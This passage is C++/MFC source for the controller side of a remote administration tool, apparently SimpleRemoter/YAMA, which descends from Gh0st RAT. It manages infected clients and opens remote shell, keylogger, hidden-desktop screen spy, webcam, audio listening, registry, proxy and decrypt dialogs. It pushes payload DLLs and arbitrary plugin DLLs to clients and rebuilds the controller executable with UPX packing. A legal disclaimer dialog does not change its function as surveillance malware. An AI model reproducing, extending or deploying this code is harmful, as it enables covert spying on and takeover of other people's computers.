			g_2015RemoteDlg->SendMessage(WM_OPENSHELLDIALOG, 0, (LPARAM)ContextObject);
			break;
		}
	case TOKEN_WSLIST:  // 窗口管理
	case TOKEN_PSLIST:  // 进程管理
		{
			g_2015RemoteDlg->SendMessage(WM_OPENSYSTEMDIALOG, 0, (LPARAM)ContextObject);
			break;
		}
	case TOKEN_AUDIO_START: // 语音监听
		{
			g_2015RemoteDlg->SendMessage(WM_OPENAUDIODIALOG, 0, (LPARAM)ContextObject);
			break;
		}
	case TOKEN_REGEDIT: // 注册表管理
		{                            
			g_2015RemoteDlg->SendMessage(WM_OPENREGISTERDIALOG, 0, (LPARAM)ContextObject);
			break;
		}
	case TOKEN_SERVERLIST: // 服务管理
		{
			g_2015RemoteDlg->SendMessage(WM_OPENSERVICESDIALOG, 0, (LPARAM)ContextObject);
			break;
		}
	case TOKEN_WEBCAM_BITMAPINFO: // 摄像头
		{
			g_2015RemoteDlg->SendMessage(WM_OPENWEBCAMDIALOG, 0, (LPARAM)ContextObject);
			break;
		}
	}
}

LRESULT CMy2015RemoteDlg::OnUserToOnlineList(WPARAM wParam, LPARAM lParam)
{
	CString strIP,  strAddr,  strPCName, strOS, strCPU, strVideo, strPing;
	CONTEXT_OBJECT* ContextObject = (CONTEXT_OBJECT*)lParam; //注意这里的  ClientContext  正是发送数据时从列表里取出的数据

	if (ContextObject == NULL || isClosed)
	{
		return -1;
	}

	try
	{
		sockaddr_in  ClientAddr;
		memset(&ClientAddr, 0, sizeof(ClientAddr));
		int iClientAddrLen = sizeof(sockaddr_in);
		SOCKET nSocket = ContextObject->sClientSocket;
		BOOL bOk = getpeername(nSocket, (SOCKADDR*)&ClientAddr, &iClientAddrLen);
		// 不合法的数据包
		if (ContextObject->InDeCompressedBuffer.GetBufferLength() != sizeof(LOGIN_INFOR))
		{
			char buf[100];
			sprintf_s(buf, "*** Received [%s] invalid login data! ***\n", inet_ntoa(ClientAddr.sin_addr));
			Mprintf(buf);
			return -1;
		}

		LOGIN_INFOR* LoginInfor = new LOGIN_INFOR;
		ContextObject->InDeCompressedBuffer.CopyBuffer((LPBYTE)LoginInfor, sizeof(LOGIN_INFOR), 0);

		auto curID = GetMasterId();
		ContextObject->bLogin = (LoginInfor->szMasterID == curID || strlen(LoginInfor->szMasterID)==0);
		if (!ContextObject->bLogin) {
			Mprintf("*** Received master '%s' client! ***\n", LoginInfor->szMasterID);
		}
		strIP = inet_ntoa(ClientAddr.sin_addr);

		//主机名称
		strPCName = LoginInfor->szPCName;

		//版本信息
		strOS = LoginInfor->OsVerInfoEx;

		//CPU
		if (LoginInfor->dwCPUMHz != -1)
		{
			strCPU.Format("%dMHz", LoginInfor->dwCPUMHz);
		}
		else {
			strCPU = "Unknown";
		}

		//网速
		strPing.Format("%d", LoginInfor->dwSpeed);

		strVideo = m_settings.DetectSoftware ? "无" : LoginInfor->bWebCamIsExist ? "有" : "无";

		strAddr.Format("%d", nSocket);
		auto v = LoginInfor->ParseReserved(10);
		AddList(strIP,strAddr,strPCName,strOS,strCPU,strVideo,strPing,LoginInfor->moduleVersion,LoginInfor->szStartTime, v, ContextObject);
		delete LoginInfor;
		return S_OK;
	}catch(...){
		Mprintf("[ERROR] OnUserToOnlineList catch an error \n");
	}
	return -1;
}


LRESULT CMy2015RemoteDlg::OnUserOfflineMsg(WPARAM wParam, LPARAM lParam)
{
	Mprintf("======> OnUserOfflineMsg\n");
	CString ip, port;
	port.Format("%d", lParam);
	EnterCriticalSection(&m_cs);
	int n = m_CList_Online.GetItemCount();
	for (int i = 0; i < n; ++i)
	{
		CString cur = m_CList_Online.GetItemText(i, ONLINELIST_ADDR);
		if (cur == port)
		{
			ip = m_CList_Online.GetItemText(i, ONLINELIST_IP);
			m_CList_Online.DeleteItem(i);
			ShowMessage(true, ip + "主机下线");
			break;
		}
	}
	LeaveCriticalSection(&m_cs);

	dlgInfo *p = (dlgInfo *)wParam;
	if (p)
	{
		switch(p->v1)
		{
		case TALK_DLG:
			{
				CTalkDlg *Dlg = (CTalkDlg*)p->hDlg;
				delete Dlg;
				break;
			}
		case VIDEO_DLG:
			{
				CVideoDlg *Dlg = (CVideoDlg*)p->hDlg;
				delete Dlg;
				break;
			}
		case SERVICES_DLG:
			{
				CServicesDlg *Dlg = (CServicesDlg*)p->hDlg;
				delete Dlg;
				break;
			}
		case AUDIO_DLG:
			{
				CAudioDlg *Dlg = (CAudioDlg*)p->hDlg;
				delete Dlg;
				break;
			}
		case SYSTEM_DLG:
			{
				CSystemDlg *Dlg = (CSystemDlg*)p->hDlg;
				delete Dlg;
				break;
			}
		case SHELL_DLG:
			{
				CShellDlg *Dlg = (CShellDlg*)p->hDlg;
				delete Dlg;
				break;
			}
		case SCREENSPY_DLG:
			{
				CScreenSpyDlg *Dlg = (CScreenSpyDlg*)p->hDlg;
				delete Dlg;
				break;
			}
		case FILEMANAGER_DLG:
			{
				CFileManagerDlg *Dlg = (CFileManagerDlg*)p->hDlg;
				delete Dlg;
				break;
			}
		case REGISTER_DLG:
			{
				CRegisterDlg *Dlg = (CRegisterDlg*)p->hDlg;
				delete Dlg; //特殊处理
				break;
			}
		case KEYBOARD_DLG:
			{
				CKeyBoardDlg* Dlg = (CKeyBoardDlg*)p->hDlg;
				delete Dlg;
				break;
			}
		case HIDESCREEN_DLG:
		{
			CHideScreenSpyDlg* Dlg = (CHideScreenSpyDlg*)p->hDlg;
			delete Dlg;
			break;
		}
		case MACHINE_DLG:
		{
			CMachineDlg* Dlg = (CMachineDlg*)p->hDlg;
			delete Dlg;
			break;
		}
		case CHAT_DLG:
		{
			CChat* Dlg = (CChat*)p->hDlg;
			delete Dlg;
			break;
		}
		case DECRYPT_DLG:
		{
			DecryptDlg* Dlg = (DecryptDlg*)p->hDlg;
			delete Dlg;
			break;
		}
		default:break;
		}
		delete p;
		p = NULL;
	}

	return S_OK;
}

void CMy2015RemoteDlg::UpdateActiveWindow(CONTEXT_OBJECT* ctx) {
	Heartbeat hb;
	ctx->InDeCompressedBuffer.CopyBuffer(&hb, sizeof(Heartbeat), 1);

	// 回复心跳
	{
		HeartbeatACK ack = { hb.Time };
		BYTE buf[sizeof(HeartbeatACK) + 1] = { CMD_HEARTBEAT_ACK};
		memcpy(buf + 1, &ack, sizeof(HeartbeatACK));
		m_iocpServer->Send(ctx, buf, sizeof(buf));
	}

	CLock L(m_cs);
	int n = m_CList_Online.GetItemCount();
	DWORD_PTR cur = (DWORD_PTR)ctx;
	for (int i = 0; i < n; ++i) {
		DWORD_PTR id = m_CList_Online.GetItemData(i);
		if (id == cur) {
			m_CList_Online.SetItemText(i, ONLINELIST_LOGINTIME, hb.ActiveWnd);
			if (hb.Ping > 0)
				m_CList_Online.SetItemText(i, ONLINELIST_PING, std::to_string(hb.Ping).c_str());
			m_CList_Online.SetItemText(i, ONLINELIST_VIDEO, hb.HasSoftware ? "有" : "无");
			return;
		}
	}
}


void CMy2015RemoteDlg::SendMasterSettings(CONTEXT_OBJECT* ctx) {
	BYTE buf[sizeof(MasterSettings) + 1] = { CMD_MASTERSETTING };
	memcpy(buf+1, &m_settings, sizeof(MasterSettings));

	if (ctx) {
		m_iocpServer->Send(ctx, buf, sizeof(buf));
	}
	else {
		EnterCriticalSection(&m_cs);
		for (int i=0, n=m_CList_Online.GetItemCount(); i<n; ++i)
		{
			CONTEXT_OBJECT* ContextObject = (CONTEXT_OBJECT*)m_CList_Online.GetItemData(i);
			if (!ContextObject->bLogin)
				continue;
			m_iocpServer->Send(ContextObject, buf, sizeof(buf));
		}
		LeaveCriticalSection(&m_cs);
	}
}

VOID CMy2015RemoteDlg::SendServerDll(CONTEXT_OBJECT* ContextObject, bool isDLL, bool is64Bit) {
	auto id = is64Bit ? PAYLOAD_DLL_X64 : PAYLOAD_DLL_X86;
	auto buf = isDLL ? m_ServerDLL[id] : m_ServerBin[id];
	if (buf->length()) {
		// 只有发送了IV的加载器才支持AES加密
		int len = ContextObject->InDeCompressedBuffer.GetBufferLength();
		char md5[33] = {};
		memcpy(md5, (char*)ContextObject->InDeCompressedBuffer.GetBuffer(32), max(0,min(32, len-32)));
		if (!buf->MD5().empty() && md5 != buf->MD5())
			m_iocpServer->OnClientPreSending(ContextObject, buf->Buf(), buf->length(len<=20));
		else {
			m_iocpServer->OnClientPreSending(ContextObject, buf->Buf(), 6 /* data not changed */);
		}
	}
}


LRESULT CMy2015RemoteDlg::OnOpenScreenSpyDialog(WPARAM wParam, LPARAM lParam)
{
	CONTEXT_OBJECT *ContextObject = (CONTEXT_OBJECT*)lParam;

	CScreenSpyDlg	*Dlg = new CScreenSpyDlg(this,m_iocpServer, ContextObject);   //Send  s
	// 设置父窗口为卓面
	Dlg->Create(IDD_DIALOG_SCREEN_SPY, GetDesktopWindow());
	Dlg->ShowWindow(SW_SHOWMAXIMIZED);

	ContextObject->v1   = SCREENSPY_DLG;
	ContextObject->hDlg = Dlg;

	return 0;
}

LRESULT CMy2015RemoteDlg::OnOpenFileManagerDialog(WPARAM wParam, LPARAM lParam)
{
	CONTEXT_OBJECT *ContextObject = (CONTEXT_OBJECT*)lParam;

	//转到CFileManagerDlg  构造函数
	CFileManagerDlg	*Dlg = new CFileManagerDlg(this,m_iocpServer, ContextObject);
	// 设置父窗口为卓面
	Dlg->Create(IDD_FILE, GetDesktopWindow());    //创建非阻塞的Dlg
	Dlg->ShowWindow(SW_SHOW);

	ContextObject->v1   = FILEMANAGER_DLG;
	ContextObject->hDlg = Dlg;
	EnterCriticalSection(&m_cs);
	/*
	for (std::vector<CFileManagerDlg *>::iterator iter = v_FileDlg.begin(); 
		iter != v_FileDlg.end(); )
	{
		CFileManagerDlg *cur = *iter;
		if (cur->m_bIsClosed)
		{
			delete cur;
			iter = v_FileDlg.erase(iter);
		}else{
			++iter;
		}
	}
	v_FileDlg.push_back(Dlg);
	*/
	LeaveCriticalSection(&m_cs);

	return 0;
}

LRESULT CMy2015RemoteDlg::OnOpenTalkDialog(WPARAM wParam, LPARAM lParam)
{
	CONTEXT_OBJECT *ContextObject = (CONTEXT_OBJECT*)lParam;

	//转到CFileManagerDlg  构造函数
	CTalkDlg	*Dlg = new CTalkDlg(this,m_iocpServer, ContextObject);
	// 设置父窗口为卓面
	Dlg->Create(IDD_DIALOG_TALK, GetDesktopWindow());    //创建非阻塞的Dlg
	Dlg->ShowWindow(SW_SHOW);

	ContextObject->v1   = TALK_DLG;
	ContextObject->hDlg = Dlg;

	return 0;
}

LRESULT CMy2015RemoteDlg::OnOpenShellDialog(WPARAM wParam, LPARAM lParam)
{
	CONTEXT_OBJECT *ContextObject = (CONTEXT_OBJECT*)lParam;

	//转到CFileManagerDlg  构造函数
	CShellDlg	*Dlg = new CShellDlg(this,m_iocpServer, ContextObject);
	// 设置父窗口为卓面
	Dlg->Create(IDD_DIALOG_SHELL, GetDesktopWindow());    //创建非阻塞的Dlg
	Dlg->ShowWindow(SW_SHOW);

	ContextObject->v1   = SHELL_DLG;
	ContextObject->hDlg = Dlg;

	return 0;
}


LRESULT CMy2015RemoteDlg::OnOpenSystemDialog(WPARAM wParam, LPARAM lParam)
{
	CONTEXT_OBJECT *ContextObject = (CONTEXT_OBJECT*)lParam;

	//转到CFileManagerDlg  构造函数
	CSystemDlg	*Dlg = new CSystemDlg(this,m_iocpServer, ContextObject);
	// 设置父窗口为卓面
	Dlg->Create(IDD_DIALOG_SYSTEM, GetDesktopWindow());    //创建非阻塞的Dlg
	Dlg->ShowWindow(SW_SHOW);

	ContextObject->v1   = SYSTEM_DLG;
	ContextObject->hDlg = Dlg;

	return 0;
}

LRESULT CMy2015RemoteDlg::OnOpenAudioDialog(WPARAM wParam, LPARAM lParam)
{
	CONTEXT_OBJECT *ContextObject = (CONTEXT_OBJECT*)lParam;

	//转到CFileManagerDlg  构造函数
	CAudioDlg	*Dlg = new CAudioDlg(this,m_iocpServer, ContextObject);
	// 设置父窗口为卓面
	Dlg->Create(IDD_DIALOG_AUDIO, GetDesktopWindow());    //创建非阻塞的Dlg
	Dlg->ShowWindow(SW_SHOW);

	ContextObject->v1   = AUDIO_DLG;
	ContextObject->hDlg = Dlg;

	return 0;
}

LRESULT CMy2015RemoteDlg::OnOpenServicesDialog(WPARAM wParam, LPARAM lParam)
{
	CONTEXT_OBJECT *ContextObject = (CONTEXT_OBJECT*)lParam;

	//转到CFileManagerDlg  构造函数
	CServicesDlg	*Dlg = new CServicesDlg(this,m_iocpServer, ContextObject);
	// 设置父窗口为卓面
	Dlg->Create(IDD_DIALOG_SERVICES, GetDesktopWindow());    //创建非阻塞的Dlg
	Dlg->ShowWindow(SW_SHOW);

	ContextObject->v1   = SERVICES_DLG;
	ContextObject->hDlg = Dlg;

	return 0;
}

LRESULT CMy2015RemoteDlg::OnOpenRegisterDialog(WPARAM wParam, LPARAM lParam)
{
	CONTEXT_OBJECT *ContextObject = (CONTEXT_OBJECT*)lParam;

	//转到CFileManagerDlg  构造函数
	CRegisterDlg	*Dlg = new CRegisterDlg(this,m_iocpServer, ContextObject);
	// 设置父窗口为卓面
	Dlg->Create(IDD_DIALOG_REGISTER, GetDesktopWindow());    //创建非阻塞的Dlg
	Dlg->ShowWindow(SW_SHOW);

	ContextObject->v1   = REGISTER_DLG;
	ContextObject->hDlg = Dlg;

	return 0;
}

LRESULT CMy2015RemoteDlg::OnOpenVideoDialog(WPARAM wParam, LPARAM lParam)
{
	CONTEXT_OBJECT *ContextObject = (CONTEXT_OBJECT*)lParam;

	//转到CFileManagerDlg  构造函数
	CVideoDlg	*Dlg = new CVideoDlg(this,m_iocpServer, ContextObject);
	// 设置父窗口为卓面
	Dlg->Create(IDD_DIALOG_VIDEO, GetDesktopWindow());    //创建非阻塞的Dlg
	Dlg->ShowWindow(SW_SHOW);

	ContextObject->v1   = VIDEO_DLG;
	ContextObject->hDlg = Dlg;

	return 0;
}

LRESULT CMy2015RemoteDlg::OnOpenKeyboardDialog(WPARAM wParam, LPARAM lParam)
{
	CONTEXT_OBJECT* ContextObject = (CONTEXT_OBJECT*)lParam;

	CKeyBoardDlg* Dlg = new CKeyBoardDlg(this, m_iocpServer, ContextObject);
	// 设置父窗口为卓面
	Dlg->Create(IDD_DLG_KEYBOARD, GetDesktopWindow());    //创建非阻塞的Dlg
	Dlg->ShowWindow(SW_SHOW);

	ContextObject->v1 = KEYBOARD_DLG;
	ContextObject->hDlg = Dlg;

	return 0;
}

LRESULT CMy2015RemoteDlg::OnOpenProxyDialog(WPARAM wParam, LPARAM lParam)
{
	CONTEXT_OBJECT* ContextObject = (CONTEXT_OBJECT*)lParam;

	CProxyMapDlg* Dlg = new CProxyMapDlg(this, m_iocpServer, ContextObject);
	Dlg->Create(IDD_PROXY, GetDesktopWindow());
	Dlg->ShowWindow(SW_SHOW);

	ContextObject->v1 = PROXY_DLG;
	ContextObject->hDlg = Dlg;

	return 0;
}

LRESULT CMy2015RemoteDlg::OnOpenHideScreenDialog(WPARAM wParam, LPARAM lParam)
{
	CONTEXT_OBJECT* ContextObject = (CONTEXT_OBJECT*)lParam;

	CHideScreenSpyDlg* Dlg = new CHideScreenSpyDlg(this, m_iocpServer, ContextObject);

	Dlg->Create(IDD_SCREEN, GetDesktopWindow());
	Dlg->ShowWindow(SW_SHOW);

	ContextObject->v1 = HIDESCREEN_DLG;
	ContextObject->hDlg = Dlg;

	return 0;
}

LRESULT CMy2015RemoteDlg::OnOpenMachineManagerDialog(WPARAM wParam, LPARAM lParam)
{
	CONTEXT_OBJECT* ContextObject = (CONTEXT_OBJECT*)lParam;

	CMachineDlg* Dlg = new CMachineDlg(this, m_iocpServer, ContextObject);

	Dlg->Create(IDD_MACHINE, GetDesktopWindow());
	Dlg->ShowWindow(SW_SHOW);

	ContextObject->v1 = MACHINE_DLG;
	ContextObject->hDlg = Dlg;

	return 0;
}

LRESULT CMy2015RemoteDlg::OnOpenChatDialog(WPARAM wParam, LPARAM lParam)
{
	CONTEXT_OBJECT* ContextObject = (CONTEXT_OBJECT*)lParam;

	CChat* Dlg = new CChat(this, m_iocpServer, ContextObject);

	Dlg->Create(IDD_CHAT, GetDesktopWindow());
	Dlg->ShowWindow(SW_SHOW);

	ContextObject->v1 = CHAT_DLG;
	ContextObject->hDlg = Dlg;

	return 0;
}

LRESULT CMy2015RemoteDlg::OnOpenDecryptDialog(WPARAM wParam, LPARAM lParam)
{
	CONTEXT_OBJECT* ContextObject = (CONTEXT_OBJECT*)lParam;

	DecryptDlg* Dlg = new DecryptDlg(this, m_iocpServer, ContextObject);

	Dlg->Create(IDD_DIALOG_DECRYPT, GetDesktopWindow());
	Dlg->ShowWindow(SW_SHOW);

	ContextObject->v1 = DECRYPT_DLG;
	ContextObject->hDlg = Dlg;

	return 0;
}

BOOL CMy2015RemoteDlg::OnHelpInfo(HELPINFO* pHelpInfo)
{
	MessageBox("Copyleft (c) FTU 2025", "关于");
	return TRUE;
}


BOOL CMy2015RemoteDlg::PreTranslateMessage(MSG* pMsg)
{
	if (pMsg->message == WM_KEYDOWN && pMsg->wParam == VK_RETURN)
	{
		return TRUE;
	}

	return CDialogEx::PreTranslateMessage(pMsg);
}


void CMy2015RemoteDlg::OnOnlineShare()
{
	CInputDialog dlg(this);
	dlg.Init("分享主机", "输入<IP:PORT>地址:");
	if (dlg.DoModal() != IDOK || dlg.m_str.IsEmpty())
		return;
	if (dlg.m_str.GetLength() >= 250) {
		MessageBox("字符串长度超出[0, 250]范围限制!", "提示", MB_ICONINFORMATION);
		return;
	}
	if (IDYES != MessageBox(_T("确定分享选定的被控计算机吗?\n目前只能分享给同类主控程序。"), _T("提示"), MB_ICONQUESTION | MB_YESNO))
		return;

	BYTE bToken[_MAX_PATH] = { COMMAND_SHARE };
	// 目标主机类型
	bToken[1] = SHARE_TYPE_YAMA;
	memcpy(bToken + 2, dlg.m_str, dlg.m_str.GetLength());
	SendSelectedCommand(bToken, sizeof(bToken));
}


void CMy2015RemoteDlg::OnToolAuth()
{
	CPwdGenDlg dlg;
	std::string hardwareID = getHardwareID();
	std::string hashedID = hashSHA256(hardwareID);
	std::string deviceID = getFixedLengthID(hashedID);
	dlg.m_sDeviceID = deviceID.c_str();

	dlg.DoModal();
}

void CMy2015RemoteDlg::OnMainProxy()
{
	EnterCriticalSection(&m_cs);
	POSITION Pos = m_CList_Online.GetFirstSelectedItemPosition();
	while (Pos)
	{
		int	iItem = m_CList_Online.GetNextSelectedItem(Pos);
		CONTEXT_OBJECT* ContextObject = (CONTEXT_OBJECT*)m_CList_Online.GetItemData(iItem);
		BYTE cmd[] = { COMMAND_PROXY };
		m_iocpServer->OnClientPreSending(ContextObject, cmd, sizeof(cmd));
		break;
	}
	LeaveCriticalSection(&m_cs);
}

void CMy2015RemoteDlg::OnOnlineHostnote()
{
	CInputDialog dlg(this);
	dlg.Init("修改备注", "请输入主机备注: ");
	if (dlg.DoModal() != IDOK || dlg.m_str.IsEmpty()) {
		return;
	}
	if (dlg.m_str.GetLength() >= 64) {
		MessageBox("备注信息长度不能超过64个字符", "提示", MB_ICONINFORMATION);
		dlg.m_str = dlg.m_str.Left(63);
	}
	BOOL modified = FALSE;
	uint64_t key = 0;
	EnterCriticalSection(&m_cs);
	POSITION Pos = m_CList_Online.GetFirstSelectedItemPosition();
	while (Pos) {
		int	iItem = m_CList_Online.GetNextSelectedItem(Pos);
		CONTEXT_OBJECT* ContextObject = (CONTEXT_OBJECT*)m_CList_Online.GetItemData(iItem);
		auto f = m_ClientMap.find(ContextObject->ID);
		if (f == m_ClientMap.end())
			m_ClientMap[ContextObject->ID] = ClientValue("", dlg.m_str);
		else
			m_ClientMap[ContextObject->ID].UpdateNote(dlg.m_str);
		m_CList_Online.SetItemText(iItem, ONLINELIST_COMPUTER_NAME, dlg.m_str);
		modified = TRUE;
	}
	LeaveCriticalSection(&m_cs);
	if (modified) {
		EnterCriticalSection(&m_cs);
		SaveToFile(m_ClientMap, DB_FILENAME);
		LeaveCriticalSection(&m_cs);
	}
}


char* ReadFileToBuffer(const std::string &path, size_t& outSize) {
	// 打开文件
	std::ifstream file(path, std::ios::binary | std::ios::ate); // ate = 跳到末尾获得大小
	if (!file) {
		return nullptr;
	}

	// 获取文件大小并分配内存
	std::streamsize size = file.tellg();
	file.seekg(0, std::ios::beg);
	char* buffer = new char[size];

	// 读取文件到 buffer
	if (!file.read(buffer, size)) {
		delete[] buffer;
		return nullptr;
	}

	outSize = static_cast<size_t>(size);
	return buffer;
}

//////////////////////////////////////////////////////////////////////////
// UPX 

BOOL WriteBinaryToFile(const char* path, const char* data, ULONGLONG size)
{
	// 打开文件，以二进制模式写入
	std::string filePath = path;
	std::ofstream outFile(filePath, std::ios::binary);

	if (!outFile)
	{
		Mprintf("Failed to open or create the file: %s.\n", filePath.c_str());
		return FALSE;
	}

	// 写入二进制数据
	outFile.write(data, size);

	if (outFile.good())
	{
		Mprintf("Binary data written successfully to %s.\n", filePath.c_str());
	}
	else
	{
		Mprintf("Failed to write data to file.\n");
		outFile.close();
		return FALSE;
	}

	// 关闭文件
	outFile.close();

	return TRUE;
}

int run_upx(const std::string& upx, const std::string &file, bool isCompress) {
	STARTUPINFOA si = { sizeof(si) };
	si.dwFlags |= STARTF_USESHOWWINDOW;
	si.wShowWindow = SW_HIDE;

	PROCESS_INFORMATION pi;
	std::string cmd = isCompress ? "\" --best \"" : "\" -d \"";
	std::string cmdLine = "\"" + upx + cmd + file + "\"";

	BOOL success = CreateProcessA(
		NULL,
		&cmdLine[0],  // 注意必须是非 const char*
		NULL, NULL, FALSE,
		0, NULL, NULL, &si, &pi
	);

	if (!success) {
		Mprintf("Failed to run UPX. Error: %d\n", GetLastError());
		return -1;
	}

	WaitForSingleObject(pi.hProcess, INFINITE);

	DWORD exitCode;
	GetExitCodeProcess(pi.hProcess, &exitCode);

	CloseHandle(pi.hProcess);
	CloseHandle(pi.hThread);

	return static_cast<int>(exitCode);
}

// 解压UPX对当前应用程序进行操作
bool UPXUncompressFile(std::string& upx, std::string &file) {
	DWORD dwSize = 0;
	LPBYTE data = ReadResource(IDR_BINARY_UPX, dwSize);
	if (!data)
		return false;

	char path[MAX_PATH];
	DWORD len = GetModuleFileNameA(NULL, path, MAX_PATH);
	std::string curExe = path;
	GET_FILEPATH(path, "upx.exe");
	upx = path;

	BOOL r = WriteBinaryToFile(path, (char*)data, dwSize);
	SAFE_DELETE_ARRAY(data);
	if (r)
	{
		file = curExe + ".tmp";
		if (!CopyFile(curExe.c_str(), file.c_str(), FALSE)) {
			Mprintf("Failed to copy file. Error: %d\n", GetLastError());
			return false;
		}
		int result = run_upx(path, file, false);
		Mprintf("UPX decompression %s!\n", result ? "failed" : "successful");
		return 0 == result;
	}
	return false;
}

struct UpxTaskArgs {
	HWND hwnd; // 主窗口句柄
	std::string upx;
	std::string file;
	bool isCompress;
};

DWORD WINAPI UpxThreadProc(LPVOID lpParam) {
	UpxTaskArgs* args = (UpxTaskArgs*)lpParam;
	int result = run_upx(args->upx, args->file, args->isCompress);

	// 向主线程发送完成消息，wParam可传结果
	PostMessageA(args->hwnd, WM_UPXTASKRESULT, (WPARAM)result, 0);

	DeleteFile(args->upx.c_str());
	delete args;

	return 0;
}

void run_upx_async(HWND hwnd, const std::string& upx, const std::string& file, bool isCompress) {
	UpxTaskArgs* args = new UpxTaskArgs{ hwnd, upx, file, isCompress };
	CloseHandle(CreateThread(NULL, 0, UpxThreadProc, args, 0, NULL));
}

LRESULT CMy2015RemoteDlg::UPXProcResult(WPARAM wParam, LPARAM lParam) {
	int exitCode = static_cast<int>(wParam);
	ShowMessage(exitCode == 0, "UPX 处理完成");
	return S_OK;
}

//////////////////////////////////////////////////////////////////////////

void CMy2015RemoteDlg::OnToolGenMaster()
{
	CInputDialog pass(this);
	pass.Init("主控生成", "当前主控程序的密码:");
	if (pass.DoModal() != IDOK || pass.m_str.IsEmpty())
		return;
	std::string masterHash(skCrypt(MASTER_HASH));
	if (hashSHA256(pass.m_str.GetBuffer()) != masterHash) {
		MessageBox("密码不正确，无法生成主控程序!", "错误", MB_ICONWARNING);
		return;
	}

	CInputDialog dlg(this);
	dlg.Init("主控密码", "新的主控程序的密码:");
	if (dlg.DoModal() != IDOK || dlg.m_str.IsEmpty())
		return;
	size_t size = 0;
	char path[MAX_PATH];
	DWORD len = GetModuleFileNameA(NULL, path, MAX_PATH);
	if (len == 0 || len == MAX_PATH) {
		return;
	}
	char* curEXE = ReadFileToBuffer(path, size);
	if (curEXE == nullptr) {
		MessageBox("读取文件失败! 请稍后再次尝试。", "错误", MB_ICONWARNING);
		return;
	}
	std::string pwdHash = hashSHA256(dlg.m_str.GetString());
	int iOffset = MemoryFind(curEXE, masterHash.c_str(), size, masterHash.length());
	std::string upx;
	if (iOffset == -1)
	{
		SAFE_DELETE_ARRAY(curEXE);
		std::string tmp;
		if (!UPXUncompressFile(upx, tmp) || nullptr == (curEXE = ReadFileToBuffer(tmp.c_str(), size))) {
			MessageBox("操作文件失败! 请稍后再次尝试。", "错误", MB_ICONWARNING);
			if (!upx.empty()) DeleteFile(upx.c_str());
			if (!tmp.empty()) DeleteFile(tmp.c_str());
			return;
		}
		DeleteFile(tmp.c_str());
		iOffset = MemoryFind(curEXE, masterHash.c_str(), size, masterHash.length());
		if (iOffset == -1) {
			SAFE_DELETE_ARRAY(curEXE);
			MessageBox("操作文件失败! 请稍后再次尝试。", "错误", MB_ICONWARNING);
			return;
		}
	}
	if (!WritePwdHash(curEXE + iOffset, pwdHash)) {
		MessageBox("写入哈希失败! 无法生成主控。", "错误", MB_ICONWARNING);
		SAFE_DELETE_ARRAY(curEXE);
		return;
	}
	CComPtr<IShellFolder> spDesktop;
	HRESULT hr = SHGetDesktopFolder(&spDesktop);
	if (FAILED(hr)) {
		AfxMessageBox("Explorer 未正确初始化! 请稍后再试。");
		SAFE_DELETE_ARRAY(curEXE);
		return;
	}
	// 过滤器：显示所有文件和特定类型文件（例如文本文件）
	CFileDialog fileDlg(FALSE, _T("exe"), "YAMA.exe", OFN_HIDEREADONLY | OFN_OVERWRITEPROMPT,
		_T("EXE Files (*.exe)|*.exe|All Files (*.*)|*.*||"), AfxGetMainWnd());
	int ret = 0;
	try {
		ret = fileDlg.DoModal();
	}
	catch (...) {
		AfxMessageBox("文件对话框未成功打开! 请稍后再试。");
		SAFE_DELETE_ARRAY(curEXE);
		return;
	}
	if (ret == IDOK)
	{
		CString name = fileDlg.GetPathName();
		CFile File;
		BOOL r = File.Open(name, CFile::typeBinary | CFile::modeCreate | CFile::modeWrite);
		if (!r) {
			MessageBox("主控程序创建失败!\r\n" + name, "提示", MB_ICONWARNING);
			SAFE_DELETE_ARRAY(curEXE);
			return;
		}
		File.Write(curEXE, size);
		File.Close();
		if (!upx.empty())
		{
			run_upx_async(GetSafeHwnd(), upx, name.GetString(), true);
			MessageBox("正在UPX压缩，请关注信息提示。\r\n文件位于: " + name, "提示", MB_ICONINFORMATION);
		}else
			MessageBox("生成成功! 文件位于:\r\n" + name, "提示", MB_ICONINFORMATION);
	}
	SAFE_DELETE_ARRAY(curEXE);
}


void CMy2015RemoteDlg::OnHelpImportant()
{
	const char* msg = 
		"本软件以“现状”提供，不附带任何保证。使用本软件的风险由用户自行承担。"
		"我们不对任何因使用本软件而引发的非法或恶意用途负责。用户应遵守相关法律"
		"法规，并负责任地使用本软件。开发者对任何因使用本软件产生的损害不承担责任。";
	MessageBox(msg, "免责声明", MB_ICONINFORMATION);
}


void CMy2015RemoteDlg::OnHelpFeedback()
{
	CString url = _T("https://github.com/yuanyuanxiang/SimpleRemoter/issues/new");
	ShellExecute(NULL, _T("open"), url, NULL, NULL, SW_SHOWNORMAL);
}

void CMy2015RemoteDlg::OnDynamicSubMenu(UINT nID) {
	if (m_DllList.size() == 0) {
		MessageBoxA("请将64位的DLL放于 'Plugins' 目录，再来点击此项菜单。"
			"\n执行未经测试的代码可能造成程序崩溃。", "提示", MB_ICONINFORMATION);
		char path[_MAX_PATH];
		GetModuleFileNameA(NULL, path, _MAX_PATH);
		GET_FILEPATH(path, "Plugins");
		m_DllList = ReadAllDllFilesWindows(path);
		return;
	}
	int menuIndex = nID - ID_DYNAMIC_MENU_BASE;  // 计算菜单项的索引（基于 ID）
	EnterCriticalSection(&m_cs);
	POSITION Pos = m_CList_Online.GetFirstSelectedItemPosition();
	while (Pos && menuIndex < m_DllList.size()) {
		Buffer* buf = m_DllList[menuIndex]->Data;
		int	iItem = m_CList_Online.GetNextSelectedItem(Pos);
		CONTEXT_OBJECT* ContextObject = (CONTEXT_OBJECT*)m_CList_Online.GetItemData(iItem);
		m_iocpServer->OnClientPreSending(ContextObject, buf->Buf(), 1 + sizeof(DllExecuteInfo));
	}
	LeaveCriticalSection(&m_cs);
}
void CMy2015RemoteDlg::OnOnlineVirtualDesktop()
{
	BYTE	bToken[32] = { COMMAND_SCREEN_SPY, 2, ALGORITHM_DIFF };
	SendSelectedCommand(bToken, sizeof(bToken));
}


void CMy2015RemoteDlg::OnOnlineGrayDesktop()
{
	BYTE	bToken[32] = { COMMAND_SCREEN_SPY, 0, ALGORITHM_GRAY };
	SendSelectedCommand(bToken, sizeof(bToken));
}


void CMy2015RemoteDlg::OnOnlineRemoteDesktop()
{
	BYTE	bToken[32] = { COMMAND_SCREEN_SPY, 1, ALGORITHM_DIFF };
	SendSelectedCommand(bToken, sizeof(bToken));
}


void CMy2015RemoteDlg::OnOnlineH264Desktop()
{
	BYTE	bToken[32] = { COMMAND_SCREEN_SPY, 0, ALGORITHM_H264 };
	SendSelectedCommand(bToken, sizeof(bToken));
}
